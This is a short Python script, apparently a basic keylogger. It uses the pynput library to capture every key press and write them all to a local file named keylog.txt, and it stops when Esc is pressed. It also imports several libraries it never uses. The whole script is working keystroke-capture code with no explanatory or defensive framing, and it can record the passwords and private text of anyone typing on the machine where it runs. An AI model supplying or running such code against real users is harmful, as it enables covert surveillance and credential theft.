import numpy as np
import pyautogui as pg
import pygetwindow as gw
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
          
def write_file(keys):
    with open('keylog.txt', 'w') as f:
        for key in keys:
            # removing '' and writing to file
            f.write(str(key).replace("'", ""))
            # add new line
            f.write('\n')
              
def on_release(key):
    # Stop keylogger when esc is pressed
    if key == Key.esc:
        # Stop listener
        return False
  
  
with Listener(on_press = on_press,
              on_release = on_release) as listener:
                     
    listener.join()